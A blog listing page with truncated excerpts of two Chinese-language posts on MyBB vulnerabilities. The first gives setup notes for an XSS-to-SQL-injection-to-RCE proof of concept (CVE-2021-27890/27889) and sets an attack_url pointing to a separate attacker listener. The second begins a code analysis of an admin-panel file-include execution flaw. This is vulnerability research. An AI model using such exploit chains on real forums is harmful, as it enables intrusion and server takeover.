        <h1 id="Mybb-XSS-SQL-RCE-POC-CVE-2021-27890-amp-CVE-2021-27889"><a href="#Mybb-XSS-SQL-RCE-POC-CVE-2021-27890-amp-CVE-2021-27889" class="headerlink" title="Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)"></a>Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)</h1><p>Mybb associate CVE-2021-27890 &amp; CVE-2021-27889 to RCE poc<br><br></p>
<p><strong>Before Use:</strong></p>
<p>There are two files here:  1.js and attack_listen.py</p>
<p>You should modify these two file:</p>
<p><strong>1.js:</strong></p>
<p>源码[1.js](/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&amp;CVE-2021-27889)/media/1.js)</p>
<p>modify the mybb forum url and attack url:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bashurl = <span class="string">&#x27;http://192.168.92.164/mybb/mybb-mybb_1825&#x27;</span> #mybb forum url</span><br><span class="line"><span class="keyword">var</span> attack_url = <span class="string">&#x27;http://192.168.92.165:8080/attack_success&#x27;</span> #change the attack machine ip.<span class="property">should</span> keep the same <span class="keyword">with</span> the attack_listen.<span class="property">py</span></span><br></pre></td></tr></table></figure>
<br>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyBB/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890%20&%20CVE-2021-27889)/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyBB/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890%20&%20CVE-2021-27889)/" data-id="cl5c2qsoz00bty8v1bi0097zu" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyBB/MyBB 后台代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyBB/MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.813Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyBB-后台代码执行漏洞"><a href="#MyBB-后台代码执行漏洞" class="headerlink" title="MyBB 后台代码执行漏洞"></a>MyBB 后台代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先全局搜索inclued函数，在<code>\mybb\admin\modules\config\languages.php</code>页面的432行发现include函数：@include<br>$editfile;</p>
<p><img src="/resource/MyBB%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
<p>该函数包含<code>editfile</code>文件，进行查看该文件来源，可以看到418行该文件由folder文件夹和file文件拼接，其中408行看到file文件由post请求提交，接下来查看folder文件夹来源</p>
<p><img src="/resource/MyBB%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
<p>通过该文件84行看到foler文件夹为<code>MYBB_ROOT.&quot;inc/languages/&quot;.$editlang.&quot;/&quot;</code>，接下来查看editlang变量，通过89行看到判断该文件名后缀为php的文件是否存在，然后查看该文件下辖的php文件只有english文件，猜测editlang为english，稍后验证，该变量会通过post请求输入</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyBB/MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyBB/MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsow00bsy8v1c5k09oq7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/58/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/57/">57</a><a class="page-number" href="/page/58/">58</a><span class="page-number current">59</span><a class="page-number" href="/page/60/">60</a><a class="page-number" href="/page/61/">61</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/60/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>